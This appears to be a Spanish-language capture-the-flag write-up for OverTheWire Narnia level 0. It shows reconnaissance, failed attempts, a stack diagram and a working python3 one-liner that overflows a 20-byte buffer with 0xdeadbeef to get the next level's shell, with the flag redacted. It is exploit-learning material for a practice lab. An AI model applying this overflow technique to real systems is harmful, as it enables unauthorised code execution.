```
███╗   ██╗ █████╗ ██████╗ ███╗   ██╗██╗ █████╗      ██████╗
████╗  ██║██╔══██╗██╔══██╗████╗  ██║██║██╔══██╗    ██╔═████╗
██╔██╗ ██║███████║██████╔╝██╔██╗ ██║██║███████║    ██║██╔██║
██║╚██╗██║██╔══██║██╔══██╗██║╚██╗██║██║██╔══██║    ████╔╝██║
██║ ╚████║██║  ██║██║  ██║██║ ╚████║██║██║  ██║    ╚██████╔╝
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝     ╚═════╝
```

```bash
$ cat /etc/target
> OverTheWire · Narnia · Level 0

$ cat /etc/objective
> sobreescribir val con 0xdeadbeef via buffer overflow

$ echo $VECTOR
> stack · scanf sin límite · little endian
```

---

## `> cat recon.txt`

```bash
$ ssh narnia0@narnia.labs.overthewire.org -p 2226
$ ltrace ./narnia0
```

El binario habla solo.
`0xdeadbeef` aparece en la cara sin que nadie se lo pida.

Si creés que es un número random, no llegaste a entender todavía.
Buscá a **Jerry Saltzer**. Buscá por qué ese valor existe.
En este mundo, nada es decorativo.

---

## `> cat hypothesis.txt`

```diff
+ [H1] scanf sin límite → overflow posible
+ [H2] val está en stack, adyacente a buf
+ [H3] little endian → bytes invertidos
- [H_WRONG] intenté con echo directo → Python 3 filtró los bytes
- [H_WRONG] olvidé el cat → shell se cerraba antes de interactuar
```

---

## `> cat attempts.txt`

<details>
<summary><code>[ATTEMPTS] — acá vive el aprendizaje real</code></summary>

```bash
# intento 1 — el clásico error de principiante
$ echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | ./narnia0
# resultado: nada. Python 3 traicionó los bytes.
# lección: echo -e no es confiable para bytes raw.

# intento 2 — sin cat
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")' | ./narnia0
# resultado: shell abre y se cierra en la nariz.
# lección: necesitás mantener stdin vivo para interactuar.

# intento 3 — correcto
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
# resultado: shell de narnia1. flag obtenida.
```

</details>

---

## `> cat break.txt`

El stack se ve así antes del exploit:

```
[ buf[0] ][ buf[1] ]...[ buf[19] ][ val        ]
[  A  ][  A  ]...[  A  ][ef][be][ad][de]
         ← 20 bytes de relleno →   ← 0xdeadbeef →
```

Veinticuatro bytes entraron donde cabían veinte.
Los cuatro que sobraron no desaparecieron —
se chorrearon sobre `val`.

Eso es todo. No es magia. Es física de memoria.

> El programador dejó un `scanf("%24s", buf)` sobre un `buf[20]`.
> Cuatro bytes de diferencia. El mismo error que hundió el **Ariane 5** en 1996.
> Un desborde de entero. 500 millones de dólares. Investigalo.

---

## `> cat exploit.txt`

```bash
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
```

Desglosado, porque el que copia sin entender es el primero en caer:

```
python3 -c               → ejecución directa. sin archivos. al grano.
sys.stdout.buffer.write  → bytes puros. Python 3 no filtra nada.
b"A"*20                  → 20 bytes de relleno. el vaso hasta el borde.
b"\xef\xbe\xad\xde"      → 0xdeadbeef en little endian. al revés.
                            buscá a Danny Cohen si no sabés por qué.
; cat                    → soporte vital. mantiene stdin abierto.
                            sin esto la shell se te cierra en la nariz.
```

---

## `> cat reflection.txt`

```diff
+ little endian no es opcional saberlo. es el alfabeto.
+ cat como soporte vital → patrón que se repite en exploits interactivos.
+ ltrace antes que gdb. el binario habla solo si sabés escuchar.
- perdí tiempo con echo -e. nunca más para bytes raw.
```

---

## `> cat flag.txt`

```
[REDACTED]
```

> La flag no es el punto.
> El punto es saber que podías llegar.

---

## `> echo $CHALLENGE`

```
El programador dejó que entraran 24 bytes en un espacio de 20.
¿Qué tiene que ver ese error con el hundimiento del Ariane 5 en el 96?

El que lo encuentre va a entender por qué un pequeño desborde
puede costar quinientos millones de dólares.

Lo demás es charla de café.
```

---

```
██████████████████████████████████████████
█                                        █
█   3l d3sb0rd3 n0 fu3 un 4cc1d3nt3.    █
█   fu3 un 4v1s0.                        █
█                                        █
██████████████████████████████████████████
```

---

> *→ video completo: [youtube.com/@t474-r0b07](https://youtube.com/@t474-r0b07)*
> *→ siguiente nivel: [narnia1](../narnia1/)*

<!-- 0x4e 0x41 0x52 0x4e 0x49 0x41 // 3l 0r1g3n 3s 0tr0 l4d0 -->
